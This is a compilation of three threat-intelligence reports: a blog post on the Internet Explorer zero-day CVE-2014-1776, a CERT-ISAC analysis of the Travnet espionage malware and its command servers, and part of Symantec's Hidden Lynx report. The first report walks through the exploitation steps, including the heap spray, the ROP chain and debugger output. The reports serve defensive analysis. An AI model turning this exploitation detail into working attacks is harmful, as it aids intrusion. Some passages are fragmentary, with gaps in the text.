FireEye Research Labs identified a new Internet Explorer (IE) zero-day exploit used in targeted attacks.The vulnerability affects IE6 through IE11, but the attack is targeting IE9 through IE11.This zero-day
bypasses both ASLR and DEP.Microsoft has assigned CVE-2014-1776 to the vulnerability and released
security advisory to track this issue.Threat actors are actively using this exploit in an ongoing campaign which we have named “Operation
Clandestine Fox.” However, for many reasons, we will not provide campaign details.But we believe this is
a significant zero day as the vulnerable versions represent about a quarter of the total browser market.We
recommend applying a patch once available.According to NetMarket Share, the market share for the targeted versions of IE in 2013 were:

IE 9    13.9%
IE 10 11.04%
IE 11   1.32%

Collectively, in 2013, the vulnerable versions of IE accounted for 26.25% of the browser market.The
vulnerability, however, does appear in IE6 through IE11 though the exploit targets IE9 and higher.</section>
<section>
<heading>The Details</heading>

The exploit leverages a previously unknown use-after-free vulnerability, and uses a well-known Flash
exploitation technique to achieve arbitrary memory access and bypass Windows’ ASLR and DEP
protections.</section>
<section>
<heading>Exploitation</heading>

<heading>• Preparing the heap</heading>

The exploit page loads a Flash SWF file to manipulate the heap layout with the common technique heap
feng shui.It allocates Flash vector objects to spray memory and cover address 0×18184000.Next, it
allocates a vector object that contains a flash.Media.Sound() object, which it later corrupts to pivot control
to its ROP chain.<heading>• Arbitrary memory access</heading>
The SWF file calls back to Javascript in IE to trigger the IE bug and overwrite the length field of a Flash
vector object in the heapspray.The SWF file loops through the heapspray to find the corrupted vector
object, and uses it to again modify the length of another vector object.This other corrupted vector object is
then used for subsequent memory accesses, which it then uses to bypass ASLR and DEP.<heading>• Runtime ROP generation</heading>

With full memory control, the exploit will search for ZwProtectVirtualMemory, and a stack pivot (opcode
0×94 0xc3) from NTDLL.It also searches for SetThreadContext in kernel32, which is used to clear the
debug registers.This technique, documented here, may be an attempt to bypass protections that use
hardware breakpoints, such as EMET’s EAF mitigation.With the addresses of the aforementioned APIs and gadget, the SWF file constructs a ROP chain, and
prepends it to its RC4 decrypted shellcode.It then replaces the vftable of a sound object with a fake one
that points to the newly created ROP payload.When the sound object attempts to call into its vftable, it
instead pivots control to the attacker’s ROP chain.<heading>• ROP and Shellcode</heading>

The ROP payload basically tries to make memory at 0×18184000 executable, and to return to 0x1818411c
to execute the shellcode.<code>
0:008> dds eax
18184100      770b5f58 ntdll!ZwProtectVirtualMemory
18184104      1818411c
18184108      ffffffff
1818410c      181840e8
18184110      181840ec
18184114      00000040
18184118      181840e4
</code>
Inside the shellcode, it saves the current stack pointer to 0×18181800 to safely return to the caller.<code>
mov        dword ptr ds:[18181800h],ebp
</code>
Then, it restores the flash.Media.Sound vftable and repairs the corrupted vector object to avoid
application crashes.<code>
18184140 8be5                      mov        esp,ebp
18184142 83ec2c                    sub        esp,2Ch
18184145 90                        nop
18184146 eb2c                      jmp        18184174
</code>
The shellcode calls SetThreadContext to clear the debug registers.It is possible that this is an attempt to
bypass mitigations that use the debug registers.</section>
<section>
<heading>Mitigation</heading>

Using EMET may break the exploit in your environment and prevent it from successfully controlling your
computer.EMET versions 4.1 and 5.0 break (and/or detect) the exploit in our tests.Enhanced Protected Mode in IE breaks the exploit in our tests.EPM was introduced in IE10.Additionally, the attack will not work without Adobe Flash.Disabling the Flash plugin within IE will
prevent the exploit from functioning.</section>
<section>
<heading>Threat Group History</heading>

The APT group responsible for this exploit has been the first group to have access to a select number of
browser-based 0-day exploits (e.g.IE, Firefox, and Flash) in the past.They are extremely proficient at
lateral movement and are difficult to track, as they typically do not reuse command and control
infrastructure.They have a number of backdoors including one known as Pirpi that we previously
discussed here.CVE-2010-3962, then a 0-day exploit in Internet Explorer 6, 7, and 8 dropped the Pirpi
payload discussed in this previous case.As this is still an active investigation we are not releasing further indicators about the exploit at this time.Acknowledgement: We thank Christopher Glyer, Matt Fowler, Josh Homan, Ned Moran, Nart
Villeneuve and Yichong Lin for their support, research, and analysis on these findings.This entry was posted in Advanced Malware, Exploits, Targeted Attack, Uncategorized and tagged zero-
day by Xiaobo Chen, Dan Caselden and Mike Scott.Bookmark the permalink.</section>
</doc>Established by the non-profit
scientific foundation “Information Sharing and Analysis Center” (ISAC) that manages the National security
Database (NSD) program, CERT-ISAC has a dedicated 30 seat threat intelligence monitoring center at New Delhi
and Mumbai to monitor constant threats and attacks on the India Cyber Space.CERT-ISAC has numerous security
experts from the National Security Database program who regularly support the research initiatives.</section>

<section>
<heading>About Po: Mobile Anti-Virus</heading>
“Po” is an advanced behavior based mobile anti-virus designed by the organization Research Bunble, especially
for the defence.The Po Engine is currently used by CERT-ISAC for malware analysis and certification of mobile
apps for security and privacy........................................................................................................................................................6
    How is this report organized?The
                                               report goes on to document a detailed analysis of targeted malware
                                               and lists a small number of Indian-based companies that were
                                               potentially threat actors involved in the campaign.As our Government is rapidly migrating towards e-governance, it is
                                            vital to ensure a robust approach to data security is implemented
                                            from an early stage to prevent misuse and subsequent attacks on
                                            critical infrastructure and the national economy.A quick look at
                                            India's history with respect to battling cyber threats, reveals an age-
old & on-going war between the “hackers” from various Nations.Defacement of Indian government sites date
back to the year 2003 & even today, they continue to happen.<figure></figure>

In this report, we analyse the various facts and provide in-depth analysis of an “Advanced persistent threat” attack
on India that makes us ask – Are we the hunter or the hunted?<heading>How is this report organized?</heading>
       Part one – Hunter or the Hunted?   Part two – Advanced persistent threat - analysis
       Part three - Primary Causes
       Part four - Recommendations
</section>
<section>
<heading>APT campaigns against India</heading>
“Advanced persistent threat” or APT as it is known, is a reality today.Unlike the regular script-kiddie attacks that
are carried out usually for fun or for fame, APTs are serious campaigns, undertaken by groups with a variety of
skill-sets.The focus of an APT campaign usually is to gather valuable information against specific companies /
organizations or selected sectors of a country.These usually begin with highly targeted spear-phishing attacks.</section>



<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                    
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>
<section>
<heading>Malware Distribution in India</heading>
Out of 25,935 websites scanned by Google, 14% websites were infected by Malware.The following table should give us a good idea of how things are shaping up.In a way, it’s
heartening to observe the CERT evolve & rise upto newer challenges & latest threats.<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                       
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>

Unfortunately, it’s not enough.The reports submitted by CERT do not take into account the most fundamental
aspects of maintaining a state of secure IT environment.This fact is evident from the number of security incidents
that happen over an year & how the right authorities react to them.If every reported incident was handled properly
by identifying the root cause, followed by a full security audit, we wonder if the numbers would grow so fast.As
mentioned earlier, cases of government sites being defaced date back to 2003.Even today, one can find servers
running older & vulnerable versions of software, poor server management, web applications deployed on these
servers being designed & implemented by programmers who lack awareness of secure coding practices, to name
a few.The private sector though, is much more cautious & alert when it comes to their IT infrastructure compared
to the government.</section>

<section>
<heading>Attack on Indian IT Infrastructure: Zone-H Statistics</heading>
Let’s analyse the state of government's IT infrastructure in the following pages.While the statistics presented by CERT-In looks alarming by itself, the actual state of domains that end with
“gov.in”, is much worse.A quick look at the following recent screenshot of www.zone-h.org site provides some
shocking insight.We carried out a preliminary analysis of our
own on the subject.Kaspersky as well as McAfee amongst others, have published detailed analysis of the malware
& the campaign.Our focus was to understand the nature of the group behind the attack & its agenda.It began with Kaspersky's
revelation of the attack.We recommend you to go through Kaspersky & McAfee's analysis of the malware to know
more about the spear phishing campaign & the exploits used.Our analysis is currently focussed only on the malware samples that are dropped on the target systems, as the
exploits used during the spear-phishing campaign are older & already patched by the respective vendors.To summarize the modus operandi of the attack, targeted phishing mails were sent to individuals, having Office
documents as attachments.These documents exploited previously known vulnerabilities ( CVE-2012-0158 and
CVE-2010-3333 ) to drop “Travnet” malware onto the systems.We managed to acquired 2 variants of the “Travnet” malware & our
analysis of the same is as follows.<figure></figure> <figure></figure>

It begins by creating a new mutex object, named “ INSTALL SERVICES NOW!”.<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                       
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>

<figure></figure>


Next step is to create a configuration file named “config_t.dat” in the windows' “system” folder.<figure></figure>

It then
populates it
with the
right




<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                        
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>

parameters, after decoding them.After the configuration file is written, it checks if the malware was previously installed or not, if not, it creates a
dynamic-link library in the “system32” folder, creates a temporary batch file named as “temp.bat” which installs
the previous DLL as a service on the system.The name of the DLL that is created, is based upon the values of the
data from “netsvcs” from the following registry key : “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Svchost”.During this runtime, it turned out to be “6to4ex.dll” but it can change from runtime
to runtime.The malware then deletes the batch file.Its obvious that this executable basically acts as a dropper.The contents of the batch file & the configuration file generated are as follows.Batch file : temp.bat

<figure></figure>


Configuration file : config_t.dat

<figure></figure>


<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                         
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>

Next section focuses on the analysis of the DLL (“6to4ex.dll”) that was dropped by this executable.<figure></figure>


<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                         
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>

Now, as we know already, this DLL was installed as a service by the previous dropper.Analysis of the
“ServiceMain” function of the DLL throws light on many interesting things.The first thing it does upon execution
is to create a new mutex object named “NetTravler Is Running!”.Its usually done to avoid running multiple
instances of the same malware.Next, it reads the configuration file.<figure></figure>
<figure></figure>


<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                         
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>

Additionally, it also creates few interesting files in the “system32” folder.<figure></figure>


The filenames are quite indicative of what their contents might be.<figure></figure>


<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                        
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>

“enumfs.ini” as the name suggests, is a complete list of all files and folders on the computer.“dnlist.ini” seems to
be noting down the date & time.“system_t.dll” on the other hand, contains a broad category of sensitive
information about the computer like the “Computer Name”, Windows version, IP address, list of running
processes, network information & so on.The contents of the files are as follows



Filename : “system_t.dll”

<figure></figure>


Upon proper character encoding & use of google's Translate feature, it turns out to be “Chinese”.<figure></figure>


<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                          
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>



Filename : “enumfs.ini”

<figure></figure>


Filename : “dnlist.ini”

<figure></figure>


Another interesting aspect of Travnet is that it can specifically search for files of the type “doc, docx, xls, xlsx, txt,
rtf, pdf” on the victim machine.This provides enough hint that this malware was designed to steal confidential
information unlike the usual botnet variants that focus primarily on providing remote access to the system or to
act as zombies for launching DDOS attacks.<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                       
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>

<figure></figure>


To summarize, the Travnet malware initially collects system information, a list of files on the victim machine
among others, then sends this data to the remote Command & Control (C&C) server, by using custom
compression & encoding functions.The malware creates a new file with the naming convention as follows :
“travlerbackinfo-%d-%d-%d-%d-%d.dll”, where the signed integer values are replaced by the current system
date & time, copies the content of “system_t.dll” into it & then, uploads it to the C&C.Another important aspect of Travnet
is the fact that it uses a custom compression & encoding algorithm on the data collected, before its sent to the
remote C&C.It seems that this older variant of the Travnet malware supported 4 different types of commands from the
remote C&C and they are as follows:



       UNINSTALL

       UPDATE

       RESET

       UPLOAD




<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                      
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>


<figure></figure>

That concludes Part-A of our Travnet analysis.<figure></figure>   <figure></figure>


This executable is apparently an updated variant of Travnet.The major changes are as follows:

        It’s an executable & not a DLL.    The compression algorithm has been modified.    It tries to install itself on the victim machine to achieve persistence instead of dropping other payloads.    Supports just 2 instructions from the C&C instead of 4, like in the previous version.<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                       
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>



Apart from these, there isn't much difference.The following analysis only focuses on what has changed.It achieves persistence by copying itself to the currently logged-in user's “temp” folder as “csmss.exe” & placing
a shortcut to it, named as “seruvice.lnk” in the “startup” folder.<figure></figure>


The next step it to create a new mutex object to avoid running multiple instances.It names the mutex as
“Assassin”.<figure></figure>


After this, it generates a unique 8 characters long “hostid”, based on volume serial number to identify the bot.This is common to the previous variant too.<figure></figure>


Then it checks if the victim machine is connected to the internet or not, by trying to resolve “smtp.live.com” & if
that fails, as a second attempt, “smtp..yahoo.com”.<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                       
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>

<figure></figure>


The strings displayed above, are actually in “Chinese” & turn out to be :

        “You can connect to the network.”

        "Unable to connect to the network."Unlike the previous variant, this one doesn't seem to collect sensitive information about the victim machine.It
just makes a list of all files & folders on the victim machine & dumps it into a file named as

“AllIndex.ini”.Next step is to compress the contents of this file, copy the compressed content to a new file named
as “AllIndex.ini_d” & then delete the previously created clear-text file.This variant also uses a
modified naming convention to upload files onto the remote C&C.The fact that even after a lot of research papers being published on the analysis of the Travnet
malware, some of the C&C servers are still active & functioning, is noteworthy.We were able to locate a few of
them.The ones that caught our attention are currently hosted on these domains :



       www.pkspring.net

       www.viprambler.com




<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                       
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>



Let’s start with the analysis of “www.viprambler.com”.WHOIS record for the domain currently is as follows:

<figure></figure>


Registrant information for the domain is as follows :


<figure></figure>

<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                       
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>



Our analysis strongly suggests that the group behind Travnet might be from China.The above record is just one
of the findings that supports the claim.Its interesting to note that the domain was recently registered, is locked
& expires in 2014.Another interesting observation is the address of the registrant.“Guangdong” province from
China seems to pop up everywhere.Its also noteworthy that the domain is still active & still hosting the Travnet
C&C.We've also observed that the C&C now remains active only during specific time of the day.The time-stamp
from the images below, confirms this.Active response from the C&C :

<figure></figure>


C&C server refusing connection later on the same day :

<figure></figure>


<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                       
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>



Its obvious that even after the discovery of the malware, the group behind this specific attack is determined to
keep it alive.The Travnet malware as well as its C&C infrastructure is constantly evolving.Lets move onto the
next active domain.The Travnet C&C hosted at “pkspring.net” seems to be fully functional & active all the time.The response from
the server when opened from a browser is as follows:

<figure></figure>


Another interesting finding is the fact that it hosts Travnet C&C on 3 different ports on the server.They are as
follows:



       80

       443

       8080



Its evident from the following pictures.Port 443

<figure></figure>


<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                      
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>

Port 8080

<figure></figure>


Moving on, we found out that 21 domains are hosted on the same server at the moment.And all of them are
active C&C servers for the Travnet malware.They also seem to have interesting domain names.Its an indication
of the seriousness of the campaign.Other domains hosted & owned by the same group on the same server/IP :

<figure></figure>


<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                       
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>



The image below proves that all of the above domains serve the same Travnet C&C on the same 3        ports, each.<figure></figure>


After this, we focused our attention on the WHOIS details of these domains.At the moment, the details of the
registrant is kept private & it was recently updated.Its also interesting to note that the group behind this has
ensured that the domain cannot be taken over by someone else.The following page contains the current WHOIS
data for the domain.“Pkspring.net”   WHOIS data (Recent)

<figure></figure>


<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                      
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>

Registrant details for the domain :

<figure></figure>


Nothing much to go on there at the moment.But thanks to older WHOIS records, we found out some interesting
facts.The same domain was earlier registered as follows:




<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                     
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>

<figure></figure>


It was apparently created on 20-march-2009 & its expiration date was set to 20-march-2013.The registrant's
information at that time was as follows:

<figure></figure>


The above data seems familiar.The only difference now being that the domains have be renewed, registration
details kept private & the email ID of the registrant has changed from “livep92@hotmail.com” to
“chenjm@sina.com”, which belongs to a private Chinese mail service (http://mail.sina.com.cn/) .The same thing




<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                      
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>

has happened with other publicly disclosed Travnet C&C domains.We also fetched details of another domain
that previously hosted Travnet C&C & has been recently renewed, most likely by the same group.A search for the email “livep92@hotmail.com” led us to the following page :

<figure></figure>


The above listed domains are already known to have hosted the Travnet C&C.We did some research on the
current status of one of the domains from the above list, “discoverypeace.org”.The current WHOIS data for the
domain “discoverypeace.org” is as follows:




<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                        
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>

<figure></figure>


This looks strikingly similar to the current status of the active C&C domain “pkstring.net”.It was also recently
updated.The older WHOIS entry for the same domain was as follows :




<footer>Powered by Po Anti-virus from www.researchbundle.com</footer>
                                      
<header>CERT-ISAC - India’s first independent CERT for mobile & electronic security</header>

<figure></figure>
</section>
<section>
<heading>Conclusion of Travnet Analysis:</heading>

From our analysis of the Travnet malware so far, it’s quite evident that many things hint at the origin of this
campaign to be from China.It’s also a known fact the Indian government & other important sectors from India
were heavily targeted during this campaign.T

The fact that this was a highly targeted attack & focused on stealing confidential documents & sensitive
information makes it noteworthy.<heading>Use of Outdated Software on Government Websites</heading>

Another interesting finding is the fact that many of the servers that host “gov.in” sites are running outdated
software versions.<figure></figure>


As an example, from the above image, it is evident that the domain “karnataka.gov.in” is hosted on a server running
“Windows Server 2003”, on 22-June-2013.To confirm this, we ran an nmap scan & it’s not surprising to find out
that the information is true.The screenshot of our nmap scan is as follows:



While use of outdated software is one of the major concerns, it seems most of the Indian government sites are
riddled with vulnerable code too.It’s quite common to locate webshells on these sites.Even important government sites, access to which can
lead to much deeper intrusion seem to be managed with little care.The following image is just one of the
examples of developing or customizing a CMS & not properly handling access-control.<figure></figure>


While defacements are usually carried out by hackers just for fun or fame, in a way its a boon in disguise.Serious
hackers can cause much more damage & remain unnoticed for a very long time by having access to the
privileges these hackers abuse to deface the site.Slowly but steadily, serious APT campaigns are on the rise.Its
very important for the nation to start upgrading its IT infrastructure & keep up with the latest security guidelines
& practices.The next part of this research paper focuses on a recent APT campaign against multiple countries
including India was targeted.While each and every technical cause for weak Indian Cyber space is beyond the scope of this document, we also
believe that India requires a strong policy driven approach along with inspiring leadership from thought leaders
and Government departments in Information security to bring the much needed change.At present there is no consistent policy to
acquire and manage the domains.The policy should address:

    1.Naming convention to be followed for official Government domains to prevent misuse by domain
         squatters
    2.A Government body that is responsible to register, administer and manage the domains
    3.Consistent working administrative and management contacts for WHOIS query
    4.Systematic policy to acquire domains and renew them on timely basis
    5.A policy to ensure “Domain Authorization keys” are managed properly and maintained in proper chain of
         custody, secured in a bank locker and handled with systematic process
</section>         

<section>
<heading>olicy on Vendor qualification for secure website development</heading>
It is crucial to select the right vendors for developing security websites and web applications for all Government
projects.The policy should address:

    1.Qualification parameters for selection of vendor for web site and web application development
    2.Certified Staff by vendor working on Government projects for Information security and secure coding
    3.Quarterly vulnerability assessment and penetration testing of all websites
    4.Security Classification of websites that determine parameters of vendor approval
    5.Comprehensive development and support contract from vendor that covers data security and associated
         penalties in event of breach
</section>

<section>
<heading>Policy on Patch Management</heading>
While it is possible that such a policy exits with organizations such as NIC, it is important to ensure these are
implemented in a timely manner.The policy on patch management must ensure outdated software must be
secured appropriately and updated as per Industry standards.The policy must address:

    1.Adequate test bed environment for testing new updates for software, patches etc
    2.Comprehensive UAT (User Acceptance Testing) before implementation of critical security patches
    3.Policy to ensure critical security updates are deployed within a specified time from date of release
    4.Backup of data and roll back methodologies in event of patch deployment issues
    5.As the nature of such community is dynamic and rapidly evolving, it is
important for the Indian Government to setup a policy and process for responsible full disclosures when Indian
citizens report possible vulnerabilities in critical digital assets of India.These must address:
    1.Process by which any citizen of India can safely submit and report vulnerabilities, full disclosures in Indian
       websites to an authorized agency without fearing action of IT Act law
    2.Guidelines under which, the security experts from the Indian community can communicate, assist and
       support law enforcement and responsible agencies in effectively addressing security gaps in Indian Cyber
       space.3.Process to act on security incidents reported by the security community in a timely manner.4.Guidelines to industry at large on how to cooperate with security experts who disclose security issues in
       their organizations
    5.Guidelines to the citizens on being Cyber aware and how to help the Government in securing the economy
       of the country from malicious hackers
</section>       

<section>
<heading>Role of National Security Database</heading>
National Security Database (NSD) is a prestigious empanelment program awarded to credible & trustworthy
Information security experts with proven skills to protect the National Critical Infrastructure & economy of the
country.The National Security Database project has been generously endorsed and supported by NTRO and CERT and has been
playing an important role in raising the cyber safety awareness across the Nation as well as engaging the community
in improving the overall cyber space of India.We sincerely believe that in coming years, the program will create a strong and credible cyber workforce that can
help the Indian Government in both offense and defence of its Cyber Space.<doc>
<cover>
SECURITY RESPONSE




Hidden Lynx – Professional
Hackers for Hire
Stephen Doherty,
Jozsef Gegeny,
Branko Spasojevic,
Jonell Baltazar
Version 1.0 – September 17, 2013




      The Hidden Lynx group is a professional team of attackers
      with advanced capabilities.Follow us on Twitter                 Visit our Blog
     @threatintel                         http://www.symantec.com/connect/symantec-blogs/sr
</cover>     

<toc>
CONTENTS




           OVERVIEW...................................................................... 3
           Background.................................................................... 5
           Who are the Hidden Lynx group?...................................5
           Who are their targets?...................................................7
           What is their motivation?...............................................7
              Corporate Espionage................................................ 8
              Attacks against government contractors	���������������� 8
           What are they capable of?.............................................They
 were responsible for the compromise of security firm Bit9’s digital code-signing certificate
 which was used to sign malware.The Bit9 breach was part of the much larger VOHO
 campaign and that campaign was just one of many operations undertaken by the group over
 the last four years.The group likely offers a “hackers for hire” operation and is tasked with retrieving specific
 information from a wide range of corporate and government targets.They are a highly
 efficient team who can undertake multiple campaigns at once, breach some of the world’s
 best-protected organizations and can change their tactics quickly to achieve their goal.They usually attack using multiple customized Trojans designed for specific purposes.Backdoor.Moudoor is used for larger campaigns and has seen widespread distribution while
 Trojan.Naid is reserved for special operations against high value targets.The group uses
 cutting-edge attack techniques which makes this team stand out from other major attack
 groups.This paper takes an in-depth look at the Hidden Lynx group, their targets and their
 motivations.It will look into their capabilities and attack strategies through their attack
 campaigns including the Bit9 incident.</section>

<section>
<heading>BACKGROUND</heading>

             A well-known
             group with
             affiliations to
             “Operation
             Aurora” managed
             to break into Bit9’s
             network using
             an SQL injection
             attack.<header>
                                                                         Hidden Lynx – Professional Hackers for Hire
</header>



<heading>Background</heading>
    In February 2013, Bit9 released a statement revealing that in July 2012, their network had been compromised by
    a malicious third-party.A well-known group named Hidden Lynx with affiliations to “Operation Aurora” managed
    to break into Bit9’s network using an SQL injection attack.These Trojans made their way into the defense
    industrial sector.However, the Bit9 compromise was only a small piece of a much larger watering-hole operation known as the
    VOHO campaign, which impacted hundreds of organizations in the United States.Further, the VOHO campaign
    itself was just one campaign of many that is attributable to this incredibly prolific group.Each campaign is
    designed to access information in governmental and commercial organizations that tend to operate in the
    wealthiest and most technologically advanced countries in the world.</section>
<section>
<heading>Who are the Hidden Lynx group?</heading>
    The Hidden Lynx group has been in operation since at least 2009 and is most likely a professional organization
    that offers a “hackers for hire” service.They have the capability to attack many organizations with concurrently
    running campaigns.They operate efficiently and move quickly and methodically.Based on these factors, the
    Hidden Lynx group would need to be a sizeable organization made up of between 50 and 100 individuals.The members of this group are experts at breaching systems.They engage in a two-pronged strategy of mass
    exploitation and pay-to-order targeted attacks for intellectual property using two Trojans designed specifically
    for each purpose:
    •	 Team Moudoor distributes Backdoor.Moudoor, a customized version of “Gh0st RAT”, for large-scale campaigns
       across several industries.The distribution of Moudoor requires a sizeable number of people to both breach
       targets and retrieve the information from the compromised networks.•	 Team Naid distributes Trojan.Naid, the Trojan found during the Bit9 incident, which appears to be reserved
       for more limited attacks against high value targets.This Trojan was leveraged for a special operation during
       the VOHO campaign and is probably used by a specific team of highly skilled attackers within the group.This
       Trojan was also found as part of “Operation Aurora” in 2009.Much of the attack infrastructure and tools used during these campaigns originate from network infrastructure
    in China.The Hidden Lynx group makes regular use of zero-day exploits and has the ability to rework and
    customize exploits quickly.They are methodical in their approach and they display a skillset far in advance of
    some other attack groups also operating in that region, such as the Comment Crew (also known as APT1).The
    Hidden Lynx group is an advanced persistent threat that has been in operation for at least four years and is
    breaking into some of the best-protected organizations in the world.With a zero-day attack already under their
    belt in 2013, they continue to operate at the leading edge of targeted attacks.</section>   

    <footer>Page 5</footer>

<section>
<heading>WHO ARE THEIR TARGETS?</heading>


                 The diverse set
                 of targets from a
                 variety of sectors
                 would indicate
                 that this group is
                 not focused on any
                 one specific task.<header>
                                                                        Hidden Lynx – Professional Hackers for Hire

</header>


<heading>Who are their targets?</heading>
    Since November 2011, hundreds of organizations worldwide have been targeted by the Hidden Lynx group.These organizations have remained relatively consistent during this time period.The group targets
    organizations operating in both the commercial sector and within all levels of government.The diverse set
    of targets from a variety of sectors would indicate that this group is not focused on any one specific task.The group manages concurrent campaigns in attacks that are global in nature.The Hidden Lynx group has most recently conducted attacks against specific organizations in South Korea and has a long history of attacking the defense industrial sector of Western countries.The top 10 organizations categorized    
    by the verticals they belong to are                 
    shown in Figure 1.The most targeted countries/regions
    are shown in Figure 2.<figure></figure>      <caption>Figure 1.Top 10 organizations targeted by the Hidden Lynx group since November 2011</caption>
</section>
<section>
<heading>What is their motivation?</heading>
    This broad range of targeted information would indicate that the attackers are part of a professional organization.They are likely tasked with obtaining very specific information that could be used to gain competitive advantages at both a corporate and nation state level.It is unlikely that this organization engages in processing or using the stolen information for direct financial gain.Their mode of operation would suggest that they may be a private organization of “hackers for hire”, who are highly skilled, experienced professionals whose services are available for those willing to pay.<figure></figure>   <caption>Figure 2.Countries/regions targeted by the Hidden Lynx group since
November 2011</caption>

</section>


<footer>Page 7</footer>
 
<header>
                                                                        Hidden Lynx – Professional Hackers for Hire
</header>


<section>
<heading>Corporate Espionage</heading>
    The financial services sector has been identified as the most heavily targeted industry overall.There is a
    tendency to target specific companies within this sector.Investment banks and asset management agencies
    account for the majority of organizations targeted within this industry.The absence of certain types of financial
    institutions, such as those operating as commercial banks, clearly indicates that the attacks are focusing on
    specific areas.The organizations involved would have expertise in large corporate deals, such as confidential
    information on upcoming mergers and acquisitions, which could be used to gain a competitive edge.Targeting
    this sector in such a concentrated fashion could provide invaluable information when negotiating large takeovers
    or trading shares on the stock exchange.Attacks on the financial sector are not limited to investment banks.Stock trading firms and one of the world’s
    largest stock exchanges have been subjected to attacks from this group.The Hidden Lynx group has also
    undertaken indirect attacks through the supply chains.Organizations that supply hardware, secure network
    communications and services specific to the financial sector have also come under attack.There is almost
    certainly a financial motivation behind these attacks.</section>
<section>
 <heading> Attacks against government contractors</heading>
    In attacks that have targeted all levels of government from local to national level, this group has repeatedly
    attempted to infiltrate these networks.Attacks against government contractors and, more specifically, the
    defense industry indicate that the group is in pursuit of confidential information and suggests that the group
    had been working for nation states.Targeting advanced technologies in specific areas such as aerospace would be useful in order to close
    technological gaps or gain knowledge of the advanced capabilities of other nation states.Attacks on
    organizations that operate in the Internet services space can provide a wealth of valuable information.The group
    had affiliations to “Operation Aurora” (See appendix for more details), a campaign that targeted a number of
    organizations including software manufacturers and defense contractors.More recently, Microsoft claimed that
    the target was databases containing emails marked for court order wiretaps.They believe that these attacks
    were counter-intelligence operations, activities that would provide benefits at a nation state level.</section>
<section>
<heading>What are they capable of?</heading>
    The group’s tools, tactics and procedures are innovative and typically cutting-edge.They use custom tools and
    techniques that they tailor to meet their objectives and maximize their chance of success.They attack public-
    facing infrastructure and have been observed installing highly customized Trojans that are purpose-built for
    stealth.They engineered one of the most successful watering-hole attacks to-date.They also undertake spear-
    phishing attacks and hack supply chains in order to distribute their custom Trojans.This is an established team
    with years of experience.They are well resourced and highly skilled.The Hidden Lynx group’s advanced capabilities are clearly demonstrated in three major campaigns.In the VOHO
    campaign, they showed how they could subvert Bit9’s established trust models.In the FINSHO campaign, they
    managed to get advanced knowledge of a zero-day exploit and in the SCADEF operation, they undertook supply
    chain attacks to succeed in their campaign.</section>
<section>
  <heading>Subverting trust protection models</heading>
    The team can adapt rapidly to counter-measures that would otherwise hinder the success of a campaign.The
    attack on Bit9 showed how the group could bypass solid trust protection models to get to their targets.However,
    this attack was only a small part of the larger VOHO campaign, where the group proved how quickly they can
    adapt and change their tactics in the face of new and unforeseen obstacles.</section>



<footer>Page 8</footer>
 
<header>
                                                                          Hidden Lynx – Professional Hackers for Hire
</header>


<section>
<heading>The Bit9 incident</heading>
Bit9 is a security company headquartered in Waltham, Massachusetts.As an alternative to traditional
signature-based antivirus solutions, Bit9 offers a trust-based security platform that runs off of a cloud-based
reputation service combined with policy-driven application control and whitelisting to protect against cyberthreats.As a result, it is difficult for a malicious third-party to install an untrusted application, such as a remote access Trojan (RAT), onto a system that is adequately protected with the Bit9 platform.Undaunted by this, the elite Hidden Lynx group took up the challenge.On February 8 2013, Bit9 released details revealing that a malicious third-party had gained access to one of their digital code-signing certificates.During this incident, a number of Trojans and malicious scripts were signed.In a follow up post on February 25, more details of the attack emerged.In July 2012, more than six months earlier, a malicious third-party gained access to their network using an SQL injection attack.Due to an operational oversight, a public-facing server that wasn’t protected with the Bit9 platform allowed the attackers to gain unauthorized access.<figure></figure>   <caption>Figure 3.Trojan.Naid – Bit9 digital certific ate, July 13, to access the virtual machine that contained one of 2012, provided by Symantec’s CA</caption>

